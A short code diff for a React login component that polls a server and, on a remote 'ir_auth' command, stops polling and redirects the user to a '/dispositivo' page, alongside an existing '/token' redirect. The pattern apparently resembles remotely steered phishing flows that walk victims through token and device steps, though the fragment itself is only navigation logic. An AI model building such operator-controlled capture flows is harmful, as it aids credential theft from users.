@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, HelpCircle, CheckCircle, XCircle } from "lucide-react";
@@ -185,6 +186,15 @@ const monitorClient = async (
           clearInterval(intervalId);
           console.log('Monitoramento parado - redirecionando...');
           navigate('/token');
+          return;
+        }
+        
+        // NOVO: Verificar comando ir_auth para redirecionar para página de dispositivo
+        if (clientData.data?.response === "ir_auth" || clientData.data?.command === "ir_auth") {
+          console.log('Detectado ir_auth - Redirecionando para /dispositivo');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - redirecionando...');
+          navigate('/dispositivo');
           return;
         }
         
